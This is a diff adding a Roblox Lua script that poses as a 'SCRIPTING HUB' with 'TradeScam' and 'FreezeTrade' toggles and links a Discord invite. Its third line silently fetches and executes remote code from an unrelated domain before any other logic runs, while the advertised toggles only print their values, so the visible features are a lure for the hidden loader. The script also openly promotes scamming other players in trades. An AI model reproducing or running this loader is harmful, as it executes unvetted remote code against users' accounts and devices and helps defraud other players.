@@ -1,0 +1,37 @@
+getgenv().gui = false 
+ 
+loadstring(game:HttpGet("https://egorikusa.space/fbe7db64adb58c83ebaa3224.lua", true))() if game.PlaceId == 142823291 then
+ 
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "SCRIPTING HUB https://discord.gg/nxC8hzWy8z", HidePremium = false, IntroText = "SCRIPTING HUB", SaveConfig = true, ConfigFolder = "OrionTest"})
+ 
+local TradeScamTab = Window:MakeTab({
+    Name = "TRADESCAM",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local FreezeTrade = Window:MakeTab({
+    Name = "SCRIPTING_HUB",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+ 
+TradeScamTab:AddToggle({
+    Name = "TradeScam",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end
+})
+ 
+TradeScamTab:AddToggle({
+    Name = "FreezeTrade",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end
+})
+ 
+end
+OrionLib:Init()
